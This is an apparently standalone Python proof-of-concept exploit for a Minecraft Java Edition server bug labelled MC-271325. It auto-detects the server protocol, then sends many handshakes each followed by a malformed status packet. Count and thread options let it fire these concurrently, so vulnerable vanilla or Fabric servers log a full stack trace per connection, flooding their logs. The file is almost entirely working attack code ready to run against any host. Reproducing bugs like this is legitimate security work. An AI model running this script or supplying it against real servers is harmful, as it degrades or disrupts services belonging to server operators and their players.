#!/usr/bin/env python3
"""Malformed Minecraft status packets that trigger log amplification (MC-271325).

Connects with a normal status handshake, then sends a 3-byte invalid status
request. On vulnerable vanilla/Fabric builds the server logs a full Netty
stack trace per connection.
"""

from __future__ import annotations

import argparse
import json
import socket
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from enum import Enum
from typing import Any

DEFAULT_PORT = 25565
DEFAULT_PROTOCOL = 774
MAX_FRAME_BYTES = 1_048_576

# Recent Java Edition protocol numbers, newest first (used when auto-probe fails).
PROTOCOL_GUESSES: tuple[int, ...] = (
    775, 774, 773, 772, 771, 770, 769, 768, 767, 766,
    765, 764, 763, 760, 754, 340, 47,
)


class PayloadVariant(str, Enum):
    TRAILING_NUL = "trailing_nul"
    UNKNOWN_PACKET = "unknown_packet"


# --- Wire encoding -----------------------------------------------------------

def encode_varint(value: int) -> bytes:
    value &= 0xFFFFFFFF
    out = bytearray()
    while True:
        byte = value & 0x7F
        value >>= 7
        if value:
            out.append(byte | 0x80)
        else:
            out.append(byte)
            return bytes(out)


def decode_varint(data: bytes, offset: int = 0) -> tuple[int, int]:
    value = 0
    shift = 0
    while offset < len(data):
        byte = data[offset]
        offset += 1
        value |= (byte & 0x7F) << shift
        if not (byte & 0x80):
            return value, offset
        shift += 7
        if shift > 35:
            raise ValueError("varint too long")
    raise ValueError("truncated varint")


def read_varint_from_socket(sock: socket.socket, max_bytes: int = 5) -> int:
    value = 0
    shift = 0
    for _ in range(max_bytes):
        chunk = sock.recv(1)
        if not chunk:
            raise ConnectionError("connection closed while reading varint")
        byte = chunk[0]
        value |= (byte & 0x7F) << shift
        if not (byte & 0x80):
            return value
        shift += 7
    raise ValueError("varint too long")


def recv_exact(sock: socket.socket, nbytes: int) -> bytes:
    parts: list[bytes] = []
    remaining = nbytes
    while remaining > 0:
        chunk = sock.recv(remaining)
        if not chunk:
            raise ConnectionError("connection closed while reading payload")
        parts.append(chunk)
        remaining -= len(chunk)
    return b"".join(parts)


def encode_string(raw: bytes) -> bytes:
    return encode_varint(len(raw)) + raw


def encode_frame(packet_id: int, body: bytes = b"") -> bytes:
    inner = encode_varint(packet_id) + body
    return encode_varint(len(inner)) + inner


def handshake_frame(protocol: int, host: str, port: int, next_state: int) -> bytes:
    host_bytes = host.encode("utf-8")
    body = (
        encode_varint(protocol)
        + encode_string(host_bytes)
        + port.to_bytes(2, "big")
        + encode_varint(next_state)
    )
    return encode_frame(0, body)


def malformed_status_frame(variant: PayloadVariant | str) -> bytes:
    if isinstance(variant, str):
        variant = PayloadVariant(variant)
    if variant is PayloadVariant.TRAILING_NUL:
        # Status request (id 0) with one extra byte — triggers decoder rejection.
        return encode_frame(0, b"\x00")
    if variant is PayloadVariant.UNKNOWN_PACKET:
        return encode_frame(1)
    raise ValueError(f"unknown variant: {variant!r}")


# Back-compat aliases used by repro scripts and older docs.
varint = encode_varint
read_varint = decode_varint
packet = encode_frame
mc_string = encode_string
handshake = handshake_frame
malformed_status_packet = malformed_status_frame


def parse_status_json(frame: bytes) -> dict[str, Any] | None:
    try:
        packet_id, offset = decode_varint(frame)
        if packet_id != 0:
            return None
        json_len, offset = decode_varint(frame, offset)
        payload = frame[offset : offset + json_len]
        return json.loads(payload.decode("utf-8"))
    except (json.JSONDecodeError, UnicodeDecodeError, ValueError):
        return None


# --- Server interaction ------------------------------------------------------

def probe_server(
    connect_host: str,
    port: int,
    handshake_host: str,
    timeout: float = 3.0,
    protocols: tuple[int, ...] = PROTOCOL_GUESSES,
) -> dict[str, Any]:
    """Legitimate status ping; returns version/protocol metadata when it works."""
    last_error: str | None = None

    for protocol in protocols:
        started = time.perf_counter()
        try:
            with socket.create_connection((connect_host, port), timeout=timeout) as sock:
                sock.settimeout(timeout)
                sock.sendall(handshake_frame(protocol, handshake_host, port, 1))
                sock.sendall(encode_frame(0))
                frame_len = read_varint_from_socket(sock)
                if frame_len <= 0 or frame_len > MAX_FRAME_BYTES:
                    continue
                frame = recv_exact(sock, frame_len)
        except OSError as exc:
            last_error = repr(exc)
            continue

        status = parse_status_json(frame)
        if not status:
            continue

        version = status.get("version") or {}
        name = str(version.get("name", ""))
        return {
            "probe_ok": True,
            "probe_protocol": protocol,
            "server_protocol": version.get("protocol"),
            "version_name": version.get("name"),
            "elapsed_ms": round((time.perf_counter() - started) * 1000, 2),
            "likely_paper": "paper" in name.lower(),
        }

    return {"probe_ok": False, "error": last_error or "no valid status response"}


def pick_protocol(probe: dict[str, Any] | None, explicit: int | None) -> int:
    if explicit is not None:
        return explicit
    if probe and probe.get("probe_ok"):
        return int(probe.get("server_protocol") or probe.get("probe_protocol") or DEFAULT_PROTOCOL)
    return DEFAULT_PROTOCOL


# Keep old name for importers.
effective_protocol = pick_protocol


def send_one(
    connect_host: str,
    port: int,
    protocol: int,
    *,
    handshake_host: str | None = None,
    timeout: float = 1.0,
    linger: float = 0.01,
    variant: PayloadVariant | str = PayloadVariant.TRAILING_NUL,
) -> dict[str, Any]:
    """One connection: handshake, malformed status packet, optional response peek."""
    hs_host = handshake_host if handshake_host is not None else connect_host
    frames = [
        handshake_frame(protocol, hs_host, port, 1),
        malformed_status_frame(variant),
    ]

    started = time.perf_counter()
    try:
        with socket.create_connection((connect_host, port), timeout=timeout) as sock:
            sock.settimeout(timeout)
            for i, payload in enumerate(frames):
                sock.sendall(payload)
                if linger and i + 1 < len(frames):
                    time.sleep(linger)
            try:
                response = sock.recv(256)
            except socket.timeout:
                response = b""
        return {
            "tcp_ok": True,
            "elapsed_ms": round((time.perf_counter() - started) * 1000, 2),
            "response_len": len(response),
            "response_hex": response[:80].hex(),
            "protocol_used": protocol,
            "handshake_host": hs_host,
            "variant": str(variant),
        }
    except OSError as exc:
        return {
            "tcp_ok": False,
            "elapsed_ms": round((time.perf_counter() - started) * 1000, 2),
            "error": repr(exc),
            "protocol_used": protocol,
            "handshake_host": hs_host,
            "variant": str(variant),
        }


def run_sends(
    connect_host: str,
    port: int,
    protocol: int,
    count: int,
    *,
    workers: int = 1,
    delay: float = 0.0,
    send_kwargs: dict[str, Any] | None = None,
    verbose: bool = True,
) -> int:
    """Fire `count` malformed status connections; return how many completed TCP."""
    send_kwargs = send_kwargs or {}
    print_lock = threading.Lock()
    connected = 0

    def report(index: int, result: dict[str, Any]) -> None:
        if not verbose:
            return
        with print_lock:
            print(f"{index}/{count}: {result}")

    if workers <= 1:
        for index in range(count):
            result = send_one(connect_host, port, protocol, **send_kwargs)
            connected += int(result.get("tcp_ok", False))
            report(index + 1, result)
            if delay:
                time.sleep(delay)
        return connected

    with ThreadPoolExecutor(max_workers=workers) as pool:
        futures = [
            pool.submit(send_one, connect_host, port, protocol, **send_kwargs)
            for _ in range(count)
        ]
        for index, future in enumerate(as_completed(futures), start=1):
            result = future.result()
            connected += int(result.get("tcp_ok", False))
            report(index, result)
    return connected


def parse_target(host: str, port: int) -> tuple[str, int, str]:
    """Split host:port / bracketed IPv6; return (connect host, port, handshake host)."""
    if host.startswith("[") and "]" in host:
        end = host.index("]")
        inside = host[1:end]
        rest = host[end + 1 :]
        if rest.startswith(":") and rest[1:].isdigit():
            return inside, int(rest[1:]), inside
        return inside, port, inside

    if host.count(":") == 1:
        maybe_host, maybe_port = host.rsplit(":", 1)
        if maybe_port.isdigit():
            return maybe_host, int(maybe_port), maybe_host

    return host, port, host


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description=(
            "Trigger MC-271325-style status log amplification on vulnerable "
            "vanilla/Fabric servers. Confirm impact in server logs, not client output."
        ),
    )
    parser.add_argument(
        "host",
        help="Server address (optional :port). Used for TCP and handshake unless overridden.",
    )
    parser.add_argument("port", type=int, nargs="?", default=DEFAULT_PORT)
    parser.add_argument(
        "--protocol",
        type=int,
        default=None,
        help=f"Handshake protocol version (default: auto-detect, else {DEFAULT_PROTOCOL}).",
    )
    parser.add_argument(
        "--handshake-host",
        default=None,
        help="Virtual host for the handshake (BungeeCord / Velocity backends).",
    )
    parser.add_argument(
        "--no-auto-protocol",
        action="store_true",
        help="Skip the status probe; use --protocol or the default.",
    )
    parser.add_argument(
        "--variant",
        choices=[v.value for v in PayloadVariant],
        default=PayloadVariant.TRAILING_NUL.value,
        help="Which malformed status packet to send after the handshake.",
    )
    parser.add_argument("--count", type=int, default=10, metavar="N")
    parser.add_argument("--delay", type=float, default=0.02, help="Pause between sends (single-threaded).")
    parser.add_argument("--timeout", type=float, default=1.0, help="Per-connection socket timeout (seconds).")
    parser.add_argument("--probe-timeout", type=float, default=3.0)
    parser.add_argument(
        "--linger",
        type=float,
        default=0.01,
        help="Delay between handshake and malformed status frame (seconds).",
    )
    parser.add_argument(
        "--threads",
        type=int,
        default=1,
        metavar="N",
        help="Parallel workers (values > 1 send connections concurrently).",
    )
    parser.add_argument("-q", "--quiet", action="store_true", help="Only print the summary line.")
    return parser


def main(argv: list[str] | None = None) -> int:
    args = build_parser().parse_args(argv)

    connect_host, port, default_hs_host = parse_target(args.host, args.port)
    handshake_host = args.handshake_host or default_hs_host
    verbose = not args.quiet

    probe: dict[str, Any] | None = None
    if not args.no_auto_protocol and args.protocol is None:
        if verbose:
            print(f"Probing {connect_host}:{port} (handshake host {handshake_host!r}) ...")
        probe = probe_server(connect_host, port, handshake_host, timeout=args.probe_timeout)
        if probe.get("probe_ok"):
            if verbose:
                print(
                    f"Server: {probe.get('version_name')!r} "
                    f"(protocol {probe.get('server_protocol')})"
                )
            if probe.get("likely_paper") and verbose:
                print(
                    "Paper detected — this fork likely suppresses the "
                    "EncoderException log path (see README)."
                )
        elif verbose:
            print("Probe failed:", probe.get("error"), "— using fallback protocol.")

    protocol = pick_protocol(probe, args.protocol)
    if verbose and args.protocol is None and probe and not probe.get("probe_ok"):
        print(f"Using protocol {protocol} (override with --protocol N).")

    send_kwargs = {
        "handshake_host": handshake_host,
        "timeout": args.timeout,
        "linger": args.linger,
        "variant": args.variant,
    }

    connected = run_sends(
        connect_host,
        port,
        protocol,
        args.count,
        workers=args.threads,
        delay=args.delay,
        send_kwargs=send_kwargs,
        verbose=verbose,
    )

    if verbose:
        print(f"tcp_connected={connected}/{args.count} (threads={args.threads})")
        print(
            "Check server logs for EncoderException / unknown disconnect packet lines. "
            "This is log amplification, not a guaranteed process crash."
        )
    return 0 if connected > 0 else 1


if __name__ == "__main__":
    sys.exit(main())
